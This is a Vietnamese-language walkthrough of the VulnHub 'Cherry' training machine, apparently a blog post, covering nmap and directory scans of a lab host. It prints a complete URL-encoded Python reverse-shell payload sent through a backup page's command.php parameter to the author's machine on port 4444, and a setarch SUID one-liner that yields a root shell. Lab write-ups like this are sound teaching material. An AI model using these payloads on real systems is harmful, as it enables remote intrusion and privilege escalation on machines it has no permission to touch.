Chào mọi người, lại là mình với series về các bài writeup của vulnhub đây. Hôm nay chúng ta tiếp tục với machine `cherry` nhé

## I. Tổng quan
### 1. Cherry machine
Tiếp tục là một machine dễ trong các machine của team [SunCSR](https://www.vulnhub.com/author/suncsr-team,696/).
#### About Release

```
Name: Cherry: 1
Date release: 14 Sep 2020
Author: SunCSR Team
Series: Cherry
```

#### Description

```
Difficulty: Easy
Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).
Information: Your feedback is appreciated - Email: suncsr.challenges@gmail.com
```

#### File Information

```
File Information
Filename: Cherry.ova
File size: 2.4 GB
MD5: DAEC319FDE021276038CD190ACA0571C
SHA1: 09C5C0398D627D96D6929D16BA20C0EF16367A37
```

#### Download

```
Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!

Cherry.ova (Size: 2.4 GB)
Download: https://drive.google.com/file/d/1AxeONd7m4C_AtFTIOCZYF2HGjiNL-kAO/view?usp=sharing
Download (Mirror): https://download.vulnhub.com/cherry/Cherry.ova
Download (Torrent): https://download.vulnhub.com/cherry/Cherry.ova.torrent   ( Magnet)
```
#### Screenshots

![](https://images.viblo.asia/602e2088-d49c-4d1f-9f10-6cb1abe47611.png)


## II. Exploit

### Host discovery

```bash
SUN-ASTERISK\vu.viet.dong@i121048-pc:~/htb$ nmap -sP 192.168.233.1/24

Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-25 13:08 +07
Nmap scan report for i121048-pc (192.168.233.1)
Host is up (0.00019s latency).
Nmap scan report for 192.168.233.131
Host is up (0.00088s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.47 seconds
```
Ở đây, có 2 ip đang chạy, trong đó `192.168.233.1` là ip của máy mình. Nên máy cherry đang chạy tại ip `192.168.233.131`.

### Services enumeration

```bash
SUN-ASTERISK\vu.viet.dong@i121048-pc:~/htb$ nmap -sV -p- 192.168.233.131

Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-25 13:26 +07
Nmap scan report for 192.168.233.131
Host is up (0.0018s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
7755/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.60%I=7%D=9/25%Time=5F6D8D82%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequest,2B,"\x0
SF:5\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid
SF:\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSL
SF:SessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x
SF:88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TLSSessionReq,2B,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20m
SF:essage\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBP
SF:rogNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
SF:"\x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LP
SF:DString,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20me
SF:ssage\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SI
SF:POptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
```

Ở đây, các cổng đang mở gồm

```
ssh: 22
http: 80, 7755
mysqlx?: 33060
```
Trước hết, chúng ta sẽ xem qua các cổng web trước

### Web directory scan
#### port 80

```bash
[13:30:19] Starting: 
[13:30:21] 400 -  166B  - /%2e%2e/google.com
[13:30:25] 301 -  178B  - /backup  ->  http://192.168.233.131/backup/
[13:30:25] 403 -  564B  - /backup/
[13:30:29] 200 -  640B  - /index.html
[13:30:29] 200 -   21B  - /info.php

Task Completed
```
Ở đây có 1 đường dẫn `/backup` khá đáng ngờ, tuy nhiên đang trả về `403` nên tạm thời chưa xem xét vội.
#### port 7755

```bash
[13:32:26] Starting: 
[13:32:28] 403 -  282B  - /.htaccess-dev
[13:32:28] 403 -  282B  - /.htaccess-local
[13:32:28] 403 -  282B  - /.htaccess-marco
[13:32:28] 403 -  282B  - /.htaccess.orig
[13:32:28] 403 -  282B  - /.htaccess.bak1
[13:32:28] 403 -  282B  - /.htaccess.old
[13:32:28] 403 -  282B  - /.htaccess.save
[13:32:28] 403 -  282B  - /.htaccess.txt
[13:32:28] 403 -  282B  - /.htaccess.sample
[13:32:28] 403 -  282B  - /.htaccessOLD
[13:32:28] 403 -  282B  - /.htaccessBAK
[13:32:28] 403 -  282B  - /.htaccessOLD2
[13:32:28] 403 -  282B  - /.htpasswd-old
[13:32:28] 403 -  282B  - /.httr-oauth
[13:32:29] 403 -  282B  - /.php
[13:32:32] 301 -  326B  - /backup  ->  http://192.168.233.131:7755/backup/
[13:32:32] 200 -    2KB - /backup/
[13:32:34] 200 -  640B  - /index.html
[13:32:34] 200 -   72KB - /info.php
[13:32:38] 403 -  282B  - /server-status
[13:32:38] 403 -  282B  - /server-status/

Task Completed
```

Lại một lần nữa, ở trang này có 1 đường dẫn `/backup` nhưng response là 200, thử vào đó xem thế nào

![](https://images.viblo.asia/0ada9292-ed39-4f33-af2a-61fbc908b784.png)

Ở đây, ta thấy 1 tệp backup, 2 tệp nén và 1 file `command.php`. Dù sao file `command.php` kia có vẻ đáng ngờ nhất nên sẽ kiểm tra nó trước.

![](https://images.viblo.asia/2716dc37-7081-45b1-90bf-c0b44ef42cb6.png)

Có vẻ đây là hint của tác giả để thực thi RCE rồi :))). Như trong phần comment kia, có thể thấy file này sẽ call tới hàm `passthru` của php với tham số `backup` gửi trong request. Tìm hiểu 1 chút về hàm `passthru` này nhé:

![](https://images.viblo.asia/4aa5a3ed-4361-46f4-a997-64eb4fb03e61.png)

Có thể thấy hàm này sẽ thực thi câu lệnh truyền vào và trả lại output về browser của người dùng. Vậy thì có thể reverse shell được rồi.

```bash
http://192.168.233.131:7755/backup/command.php?backup=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.233.1%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

![](https://images.viblo.asia/5a695553-0d43-4c43-bd9a-a269aba92116.png)

### Privileges Escalation
Thử enum machine này, mình thấy 1 suid file khá đáng ngờ:

![](https://images.viblo.asia/a4997663-5732-4669-ae85-e30011378ad3.png)

Thử tìm kiếm file này trên [gtfobins](https://gtfobins.github.io/gtfobins/setarch/), có thể thấy file này cho phép ta leo lên root nếu được set suid:

![](https://images.viblo.asia/7dabf8a0-dc1f-4c14-8639-96ee1802d4e4.png)

Vậy thì easy rồi

```bash
www-data@cherry:/home/cherry$ setarch $(arch) /bin/sh -p
setarch $(arch) /bin/sh -p
# whoami
whoami
root
```

![](https://images.viblo.asia/04dd127b-587e-4203-98af-e07b88d79a0c.png)


## III. Conclusion
Có thể nói đây là 1 machine rất dễ khi tác giả không yêu cầu các kĩ thuật khó để RCE hay leo quyền cũng như không cài cắm các rabbit hole để làm khó người chơi. Hầu hết các bước giải machine này đều được lên hint cụ thể, không ofucase. Nhìn chung, đây là machine phù hợp với những người mới, cần rèn luyện các kĩ năng cơ bản